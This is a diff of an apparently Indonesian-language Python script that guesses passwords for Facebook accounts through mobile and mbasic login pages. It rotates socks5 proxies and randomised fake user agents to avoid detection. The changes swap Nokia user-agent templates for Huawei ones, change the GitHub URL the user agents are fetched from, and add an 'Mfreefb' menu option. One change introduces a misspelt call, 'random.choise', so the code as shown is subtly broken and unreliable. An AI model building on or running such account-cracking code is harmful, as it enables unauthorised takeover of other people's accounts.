@@ -27,17 +27,17 @@ try:
 except Exception as e:
     exit(e)
 for xd in range(10000):
-	a='Mozilla/5.0 (S60V5; U; en-us;'
+	a='Mozilla/5.0 (Linux; Android 10;'
 	b=random.randrange(1, 9)
 	c=random.randrange(1, 9)
-	d='Nokia5'
+	d='Huawei BROWSER'
 	e=random.randrange(100, 9999)
-	f='UC Browser8.2.0.132/50/355/UCWEB Mobile/'
+	f='MED-LX9; HMSCore 6.6.0.331) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
 	g=random.randrange(1, 9)
 	h=random.randrange(1, 4)
 	i=random.randrange(1, 4)
 	j=random.randrange(1, 4)
-	k='UCWEB Mobile'
+	k='HuaweiBrowser/12.1.0.303 Mobile Safari/537.36'
 	uaku2=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
 	ugen.append(uaku2)
 	
@@ -47,7 +47,7 @@ def uaku():
 		for ub in ua : 
 			ugen.append(ub)
 	except:
-		a=requests.get('https://github.com/IlmanRamdhaniR/ILMAN-XD/blob/main/ua2.txt').text
+		a=requests.get('https://github.com/agusdani17/agus17/blob/main/uaku.txt').text
 		ua=open('.ua2.txt','w')
 		aa=re.findall('line">(.*?)<',str(a))
 		for un in aa:
@@ -376,10 +376,10 @@ def setting():
 	else:
 		print('├──> PILIH YANG BENAR ')
 		exit()
-	print(f'├──> 1. MOBILE FACEBOOK {h}[Rekomendasi] ')
-	print(f'├──> 2. MBASIC FACEBOOK{x} ')
+	print(f'├──> 1. MOBILE FACEBOOK {h}[Rekomendasi]{x}')
+	print(f'├──> 2. MBASIC FACEBOOK ')
 	###print('├──> 3. bbh  ')
-	###print('├──> 4. Mfreefb ')
+	print(f'├──> 3. Mfreefb ')
 	print('|')
 	hc = input('├──> PILIH : ')
 	if hc in ['1','01']:
@@ -467,7 +467,7 @@ def crack(idf,pwv):
 	sys.stdout.flush()
 	nip=random.choice(prox)
 	proxs= {'http': 'socks5://'+nip}
-	ua = random.choice(ugen)
+	ua = random.choise(ugen)
 	ses = requests.Session()
 	for pw in pwv:
 		try:
